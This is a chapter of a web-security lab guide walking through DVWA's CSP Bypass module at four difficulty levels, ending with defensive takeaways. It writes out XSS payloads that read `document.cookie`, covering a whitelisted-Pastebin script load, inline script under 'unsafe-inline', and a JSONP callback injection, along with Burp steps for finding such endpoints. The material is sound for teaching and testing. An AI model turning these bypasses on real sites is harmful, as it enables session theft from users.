# Chapter 13 — CSP Bypass (DVWA Module: CSP Bypass)

## Objective
Understand Content-Security-Policy as a defense-in-depth layer against XSS, and identify common CSP misconfigurations that still permit script injection.

## Prerequisites
- Target: `http://localhost/dvwa/vulnerabilities/csp/`
- Burp Proxy → inspect the `Content-Security-Policy` response header on each request

---

## 🟢 LOW

### Source logic
Server sends an overly permissive policy, e.g.:
```
Content-Security-Policy: script-src 'self' https://pastebin.com
```
The app includes user-controllable content that ends up loaded as a script `src`, and the policy trusts an external, attacker-abusable host (`pastebin.com`, where anyone can host arbitrary JS).

### Burp Suite steps
1. In Proxy → HTTP history, open the response headers for the CSP page; note the exact `script-src` allow-list.
2. Host a malicious JS snippet on the trusted domain (e.g., a public Pastebin **raw** URL) containing:
   ```javascript
   alert(document.cookie);
   ```
3. Inject a `<script src="https://pastebin.com/raw/XXXXX"></script>` reference through whatever input the app allows (query param, comment field, etc.) — since `pastebin.com` is explicitly whitelisted, the browser executes it despite CSP being present.
4. Confirm in Burp/DevTools Console that no CSP violation is reported for this load.

### Why it works
A CSP is only as strong as its allow-list. Whitelisting large, user-content-hosting platforms (Pastebin, JSFiddle, some CDNs with open write access, `*.googleusercontent.com`, etc.) reintroduces an attacker-controlled script source.

---

## 🟡 MEDIUM

### Source logic
```
Content-Security-Policy: script-src 'self' 'unsafe-inline'
```
Adds `'unsafe-inline'`, which defeats the primary XSS-mitigating purpose of CSP.

### Burp Suite bypass
Simply inject any inline script via whatever XSS-style input point exists on the page:
```
<script>alert(document.cookie)</script>
```
`'unsafe-inline'` explicitly permits inline `<script>` blocks and inline event handlers — CSP does nothing to stop this.

### Why the bypass works
`'unsafe-inline'` is a well-known CSP anti-pattern that re-enables the exact class of attack (inline script injection) CSP is designed to prevent — often added to "fix broken pages" without understanding the security trade-off.

---

## 🔴 HIGH

### Source logic
```
Content-Security-Policy: script-src 'self'
```
Looks solid — only same-origin scripts allowed, no inline, no external hosts. But the app may still have a **JSONP endpoint** or an **open redirect** on `'self'` that can be abused, e.g.:
```
<script src="/dvwa/vulnerabilities/csp/source.php?callback=alert(document.cookie)//"></script>
```
if any same-origin endpoint reflects user input in a JS-executable way (a JSONP callback parameter is a classic CSP `'self'` bypass vector).

### Burp Suite exercise
1. Use Burp's **site map / passive scan** to enumerate all `self`-origin endpoints that return `Content-Type: application/javascript` or reflect a `callback` parameter.
2. Test each for JSONP-style reflection:
   ```
   GET /some/endpoint.php?callback=alert(1)
   ```
3. If found, reference it as the `src` of an injected `<script>` tag — since it's same-origin, `'self'` permits loading it, and its reflected content executes as attacker-controlled JS.

### Why it's still risky
`'self'` is safer than external allow-lists but is not automatically safe — **any** same-origin script-returning endpoint that reflects attacker input (JSONP, open file upload paths under the same origin, Angular/JSONP-style callback endpoints) becomes a bypass vector.

---

## ⚪ IMPOSSIBLE

### Source logic
```
Content-Security-Policy: default-src 'none'; script-src 'self' 'nonce-{RANDOM_PER_REQUEST_NONCE}'; object-src 'none'; base-uri 'none';
```
Combined with:
- A fresh, unpredictable **nonce** generated per response and required on every legitimate `<script>` tag.
- No `'unsafe-inline'`, no external hosts, no wildcard sources.
- Proper output encoding on all user input (defense-in-depth, not reliance on CSP alone).
- `object-src 'none'` and `base-uri 'none'` to close plugin- and `<base>`-tag-based bypass classes.

### Why the attack fails
Any injected `<script>` tag lacking the correct, unguessable, per-request nonce is blocked by the browser regardless of same-origin status. Because the nonce is regenerated every response and never predictable/reusable, an attacker cannot forge a compliant `<script nonce="...">` tag even via a same-origin reflection bug — and output encoding independently prevents the injection point from existing at all.

### Burp Suite exercise
Attempt every payload from Low/Medium/High; observe the browser console logging **CSP violation** errors for each, with the response header showing a new nonce value on every reload (confirm via Burp Proxy HTTP history diff).

---

## Root Cause Analysis
CSP is a **defense-in-depth** mitigation, not a primary fix for injection flaws. Misconfigurations (`'unsafe-inline'`, overly broad host allow-lists, missing `object-src`/`base-uri` restrictions) are extremely common and each reopen a specific XSS sub-class. A correctly scoped, nonce-based CSP combined with proper output encoding provides layered protection.

## Defensive Takeaways
- Never use `'unsafe-inline'` or `'unsafe-eval'` in production CSP.
- Avoid broad/wildcard host allow-lists; prefer `'self'` plus specific, audited hosts only.
- Use per-response **nonces** or **hashes** for any necessary inline scripts.
- Set `object-src 'none'` and `base-uri 'none'` to close common bypass classes.
- Treat CSP as a *second layer*, not a substitute for output encoding and input validation.
- Regularly audit same-origin endpoints for JSONP/reflection issues that undermine `'self'`.

---
⬅ [Back: XSS DOM](12-xss-dom.md) | ➡ [Next: JavaScript Attacks](14-javascript-attacks.md)
